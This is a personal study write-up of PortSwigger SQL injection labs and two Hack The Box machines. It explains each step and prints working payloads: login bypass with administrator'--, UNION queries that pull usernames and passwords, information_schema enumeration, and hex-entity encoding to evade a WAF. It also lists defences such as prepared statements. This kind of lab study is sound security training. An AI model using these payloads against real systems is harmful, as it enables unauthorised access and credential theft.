# PortSwigger – SQL Injection

**Platform:** PortSwigger Web Academy  
**Topic:** SQL Injection  
**Date:** June 2026  

---

## What is SQL Injection?

SQL Injection (SQLi) happens when user-supplied input is inserted directly into a SQL query without proper sanitization. An attacker can manipulate the query logic to retrieve data they shouldn't have access to, bypass authentication, or in some cases execute commands on the database server.

**Root cause:** The app trusts user input and builds queries by string concatenation instead of using Prepared Statements.

---

## Lab 1 – SQL Injection in WHERE Clause (Retrieving Hidden Data)

**Goal:** Make the application return all products, including unreleased ones.

### What's happening under the hood

The app builds this query internally when you select a category:

```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
```

`released = 1` is the filter that hides unreleased products. If we can break out of the string and manipulate the logic, we can remove that filter.

By injecting `' OR 1=1--` the query becomes:

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

- `OR 1=1` is always true → every row in the table gets returned
- `--` is a SQL comment → everything after it (including `AND released = 1`) gets ignored

### Solution

Modify the URL to:
```
/filter?category=Accessories'+OR+1=1--
```

### Key Takeaway
> Anywhere user input flows directly into a SQL query → potential SQLi. The `--` comment trick works in most SQL dialects (MySQL, PostgreSQL, MSSQL). `#` is an alternative comment character in MySQL.

---

## Lab 2 – SQL Injection Login Bypass

**Goal:** Log in as `administrator` without knowing the password.

### What's happening under the hood

The login query looks something like this:

```sql
SELECT * FROM users WHERE username = 'administrator' AND password = 'whatever'
```

Both conditions must be true for a successful login. If we can comment out the password check, only the username needs to match.

By entering `administrator'--` as the username, the query becomes:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'whatever'
```

- The `'` closes the username string
- `--` comments out the rest → password check is gone
- The query only checks if `administrator` exists → it does → login successful

### Solution

1. Navigate to **My Account → Login**
2. Username: `administrator'--`
3. Password: anything (literally doesn't matter, it's commented out)
4. Login succeeds

### Key Takeaway
> Authentication bypass via SQLi is one of the most critical real-world vulnerabilities. Any login form that doesn't use Prepared Statements is potentially vulnerable. In a Bug Bounty context this would be a **Critical** finding.

---

## Lab 3 – SQL Injection with Filter Bypass via XML Encoding

**Goal:** Extract admin credentials from the `users` table. A WAF (Web Application Firewall) is blocking direct SQL injection attempts.

### What's happening under the hood

The app uses XML in its stock-check request. The `storeId` parameter is vulnerable to SQLi, but a WAF is sitting in front of it and blocking obvious SQL keywords like `UNION`, `SELECT`, etc.

The bypass: encode the SQL payload using HTML hex entities via the **Hackvertor** Burp extension. The WAF doesn't recognize the encoded payload as SQL, but the database decodes and executes it normally.

Payload we want to inject into `storeId`:
```sql
UNION SELECT username || '~' || password FROM users
```

The `||` operator concatenates username and password with `~` as separator so we get output like `administrator~ur4ik27zgtl9c3k79va9`.

### Solution

1. Open **Burp Suite** and install the **Hackvertor** extension (BApp Store)
2. Browse to a product page and click **Check stock** — intercept the request
3. Send the request to **Repeater**
4. In the XML body, locate the `<storeId>` tag
5. Insert the payload inside it:
   ```
   UNION SELECT username || '~' || password FROM users
   ```
6. Select the entire payload → right-click → **Extensions → Hackvertor → Encode → hex_entities**
7. The payload now looks like encoded garbage to the WAF but executes as SQL
8. Click **Send**
9. Response contains credentials for all users — use the `administrator` credentials to log in

### Key Takeaway
> WAFs are not a reliable security control on their own — encoding, obfuscation, and alternative syntax can bypass most of them. Defense must happen at the code level with Prepared Statements, not at the perimeter. This lab also shows why **Burp Suite extensions** are essential — Hackvertor alone makes WAF bypass trivial.

---

## General Defense: How to Prevent SQL Injection

| ❌ Vulnerable | ✅ Secure |
|---|---|
| String concatenation in queries | Prepared Statements / Parameterized Queries |
| Trusting user input | Input validation + whitelisting |
| Relying on WAF only | Defense in depth at code level |
| Verbose error messages | Generic error messages |


---

## Examining the database in SQL injection attacks

To exploit SQL injection vulnerabilities, it is necessary to find information about the database type, version and tables and columns the database has.

**Version**

|Database tpye | Query |
|--------------|-------|
|Microsoft, MySQL|`SELECT @@version|
|Oracle| SELECT * FROM v$version|
|PostgreSQL | SELECT version()|

## Lab 4 – Querying Database Type and Version on Oracle

**Goal:** Determine the database version running on the target Oracle database.

### What's happening under the hood

To extract data via a UNION attack, two things need to be true:
1. We need to know how many columns the original query returns
2. Those columns need to accept string data

Oracle also requires that every `SELECT` statement references a table – unlike MySQL/PostgreSQL where you can do `SELECT 'a','b'` directly. Oracle's workaround is the **dual** table: a built-in dummy table that always exists and returns exactly one row.

### Solution

**Step 1 – Determine column count using Burp Suite Repeater**

Intercept a category filter request and send it to Repeater. Test with increasing string values using `dual`:

```sql
' UNION SELECT 'a','b' FROM dual--
```

No error → the query returns **2 columns**, both accepting strings.

**Step 2 – Extract the version**
 
`v$version` is an Oracle system view containing database version info. The `BANNER` column returns the full version string. In URL-based injection, spaces must be replaced with `+`:
 
```
GET /filter?category=Corporate+gifts'+UNION+SELECT+BANNER,+'test'+FROM+v$version-- HTTP/2
```
 
Which translates to:
```sql
' UNION SELECT BANNER,'test' FROM v$version--
```
 
The response returns the full Oracle version string in the product listing → lab solved.

### Key Takeaway
- **`dual` table:** Oracle always requires a `FROM` clause – `dual` is the go-to dummy table when you don't need real data
- **`v$version.BANNER`** returns the full version string. `v$instance.VERSION` only returns the short number (e.g. `19.0.0.0.0`) – not enough for this lab
- **URL spaces:** In URL-based payloads, spaces must be written as `+`, otherwise the query breaks
- **BANNER caps:** Oracle column names are case-insensitive – `BANNER`, `banner`, and `Banner` all work. Caps is just convention
---

## Lab 5 – Querying Database Type and Version on MySQL and Microsoft
 
**Goal:** Determine the database version running on the target MySQL/Microsoft database.
 
### What's happening under the hood
 
Same approach as Lab 4 – UNION attack to extract version info. Two key differences from Oracle:
 
1. No `FROM dual` needed – MySQL and MSSQL don't require a table reference in `SELECT`
2. Comment syntax is different – `#` is used instead of `--` for URL-based payloads in MySQL
### Solution
 
**Step 1 – Determine column count using Burp Suite Repeater**
 
Intercept a category filter request and send it to Repeater. Test directly with string values – no `FROM dual` needed:
 
```
'+UNION+SELECT+'a','b'#
```
 
No error → the query returns **2 columns**, both accepting strings.
 
**Step 2 – Extract the version**
 
```
'+UNION+SELECT+@@version,NULL#
```
 
The response returns the full version string in the product listing → lab solved.
 
### Key Takeaways
 
- **No `FROM dual`:** Unlike Oracle, MySQL and MSSQL don't require a table reference – `UNION SELECT 'a','b'` works directly
- **`#` vs `--` for comments:** Both work in MySQL, but `--` requires a trailing space (`-- `) to be valid.
- **`@@version`** works for both MySQL and MSSQL – same payload, different from Oracle's `BANNER FROM v$version`

---

## Lab 6 – SQL injection attack, listing the database contents on non-Oracle databases
 
**Goal:** Recieve the username and passwords of all users and log in as administrator afterwards.
 
### What's happening under the hood
 
Same approach as Lab 4&5
 
**Step 1 – Determine column count using Burp Suite Repeater**
 
Intercept a category filter request and send it to Repeater. 
 
```
'+UNION+SELECT+'a','b'#
```
 
No error → the query returns **2 columns**, both accepting strings.
 
**Step 2 – Extract the table names**

To identify in which table username and passwords are found, a list of every table name is required 

```
'+UNION+SELECT+table_name,+null+from+information_schema.tables--+
```
 
The response returns every name of every table in the DB

**Step 3 - Identify the correct column**

Under the table-names there is one specific one which stands out. It is **`users_jnpmfr`**
Too see if the assumption is correct, the following command can be used to see what Columns the table has
```
'+UNION+SELECT+column_name,+null+from+information_schema.columns+where+table_name='users_jnpmfr'--+

```
**Step 4 - Extract usernames and passwords**

2 different columns are raising attention: **`username_kfvudi`** and **`password_hjhrax`**

To see the values of the columns, following command can be used:

```
'+UNION+SELECT+username_kfvudi,+password_hjhrax+from+users_jnpmfr--+ 
```

Finally: Administrator has a password column with the correct password stored. Both can be used to log in afterwards and the Lab is solved.

### Key Takeaways
 
- Thanks to `information_schema` it is possible to recieve table and column names

---

On Oracle, same information can be found but has different Syntax:
- List all tables by querying `all_tables`
```
SELECT * FROM all_tables
```
- List all columns by querying `all_tab_columns`
```
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'

```



## Lab 7 – SQL injection attack, listing the database contents on Oracle
 
**Goal:** Recieve the username and passwords of all users and log in as administrator afterwards.
 
Basically the same as Lab 6, but with the new Syntax for Oracle


## HTB Appointment
- Applied SQLi login bypass (admin' OR 1=1#) on a real HTB machine.
- Port 80 (HTTP) → login form → MySQL comment bypass with #.
- No separate write-up created – concepts covered in Lab 2

<img width="1294" height="176" alt="image" src="https://github.com/user-attachments/assets/cb669f2f-d3b8-4819-8cff-a9b0aa9f2eca" />


## HTB – Sequel
 
Applied MySQL CLI basics on a real HTB machine. No separate write-up created.
 
**Summary:**
- nmap found port **3306** (MySQL/MariaDB)
- Logged in as `root` without password: `mysql -u root -h Machine_IP -P 3306`
- Found unique database `htb` alongside the three default MySQL databases
- Located flag in table `config` using `DESCRIBE` and `SELECT * FROM config`
<img width="1242" height="152" alt="image" src="https://github.com/user-attachments/assets/69f35d54-b54a-4257-b517-27696b4bf880" />



---
### Update : 09.07.2026

## UNION attacks

- `UNION` allows to execute one more additional `SELECT`query
- 2 key requirements must be met so `UNION` works
  1) Queries must return the same number of columns as the database have
  2) Data types in each column must be compatible

### How to determine the number of columns:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
-> works because NULL is convertible to every common data type, so its always the right data type
-> Increase `NULL` as long as there is an error

### How to find columns with useful data type
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
-> Checks every column`s data type. If an error occures, then the relevant column is not suitable for string data

- To retrieve 2 values together in a single column `|| '~' ||` can be used
  For example:
  `' UNION SELECT username || '~' || password FROM users--`
  will output:
  `admin~iusafhdgbiaus1238asdf`
  `user1~testpw`
